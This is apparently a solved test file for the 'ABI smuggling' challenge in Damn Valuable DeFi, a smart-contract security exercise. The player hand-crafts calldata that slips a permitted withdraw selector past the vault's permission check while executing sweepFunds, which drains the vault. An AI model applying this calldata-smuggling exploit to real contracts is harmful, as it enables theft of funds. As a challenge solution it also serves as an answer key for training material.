const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] ABI smuggling", function () {
  let deployer, player, recovery;
  let token, vault;

  const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player, recovery] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy();

    // Deploy Vault
    vault = await (await ethers.getContractFactory("SelfAuthorizedVault", deployer)).deploy();
    expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

    // Set permissions
    const deployerPermission = await vault.getActionId("0x85fb709d", deployer.address, vault.address);
    const playerPermission = await vault.getActionId("0xd9caed12", player.address, vault.address);
    await vault.setPermissions([deployerPermission, playerPermission]);
    expect(await vault.permissions(deployerPermission)).to.be.true;
    expect(await vault.permissions(playerPermission)).to.be.true;

    // Make sure Vault is initialized
    expect(await vault.initialized()).to.be.true;

    // Deposit tokens into the vault
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

    expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(0);

    // Cannot call Vault directly
    await expect(vault.sweepFunds(deployer.address, token.address)).to.be.revertedWithCustomError(
      vault,
      "CallerNotAllowed"
    );
    await expect(
      vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // The player must call the execute function on the vault.
    //  - target = vault.address
    //  - actionData = ABI-encoded data of sweepFunds + args (recovery address and token address)

    // But we can only call the withdraw function (0xd9caed12) on the vault. So we need to manually
    // craft a calldata with the widthdraw selector at offset 4 + 96, but with the real data at
    // offset 4 + 128. This is possible because bytes is a dynamic type. Here is what we can do:

    // 1. Let's prepare the calldata for the sweepFunds function:
    // - sweepFunds selector:   85fb709d
    // - Recovery address:      0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC
    // - Token address:         0000000000000000000000005FbDB2315678afecb367f032d93F642f64180aa3
    // => sweepFunds calldata = 85fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005FbDB2315678afecb367f032d93F642f64180aa3

    // we can check that this works correctly:
    // const sweepFundsCalldata =
    //   "0x85fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005FbDB2315678afecb367f032d93F642f64180aa3";
    // await vault.connect(deployer).execute(vault.address, sweepFundsCalldata);

    // 2. Let's craft the rest of the calldata to call the execute function from the player this time:
    // hex:                                           0x
    // execute selector:                              1cff79cd
    // target address:                                000000000000000000000000e7f1725E7734CE288F8367e1Bb143E90bb3F0512
    // offset + 1 slot to trick the vault (96 bytes): 0000000000000000000000000000000000000000000000000000000000000080
    // blank slot (data length no longer here):       0000000000000000000000000000000000000000000000000000000000000000
    // withdraw selector + padding zeros:             d9caed1200000000000000000000000000000000000000000000000000000000
    // actionData length (68 bytes):                  0000000000000000000000000000000000000000000000000000000000000044
    // sweepFunds calldata:                           85fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005FbDB2315678afecb367f032d93F642f64180aa3

    const actionData =
      "0x1cff79cd000000000000000000000000e7f1725E7734CE288F8367e1Bb143E90bb3F051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005FbDB2315678afecb367f032d93F642f64180aa3";
    await player.sendTransaction({
      to: vault.address,
      data: actionData,
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(0);
    expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
